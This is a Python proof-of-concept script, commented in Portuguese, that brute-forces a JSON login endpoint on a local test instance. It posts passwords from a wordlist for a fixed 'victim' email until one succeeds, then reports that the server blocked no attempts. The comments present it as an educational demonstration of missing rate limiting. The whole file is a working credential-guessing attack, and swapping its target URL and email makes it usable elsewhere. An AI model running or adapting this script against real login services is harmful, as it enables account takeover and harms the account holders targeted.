#!/usr/bin/env python3
# PoC — brute force no /auth/login (sem rate limiting).
# Uso educacional, só contra a instância local (localhost).
# Feito em Python porque o endpoint espera JSON, e o http-post-form do Hydra
# usa ':' como separador, o que quebra com o corpo JSON.

import requests
import time

ALVO = "http://localhost:3001/auth/login"
EMAIL = "vitima@teste.local"
WORDLIST = "senhas.txt"

def main():
    with open(WORDLIST) as f:
        senhas = [linha.strip() for linha in f if linha.strip()]

    print(f"[*] Alvo: {ALVO}")
    print(f"[*] Email: {EMAIL}")
    print(f"[*] Senhas a testar: {len(senhas)}")
    print("-" * 50)

    inicio = time.time()

    for i, senha in enumerate(senhas, 1):
        resp = requests.post(
            ALVO,
            json={"email": EMAIL, "password": senha},
        )

        if resp.status_code == 200:
            decorrido = time.time() - inicio
            print(f"[{i:>3}] {senha:<20} -> {resp.status_code}  <<< SENHA ENCONTRADA")
            print("-" * 50)
            print(f"[+] Comprometido em {i} tentativas ({decorrido:.2f}s).")
            print("[+] Nenhuma tentativa foi bloqueada pelo servidor.")
            return

        print(f"[{i:>3}] {senha:<20} -> {resp.status_code}")

    print("-" * 50)
    print("[-] Senha não encontrada na wordlist.")

if __name__ == "__main__":
    main()
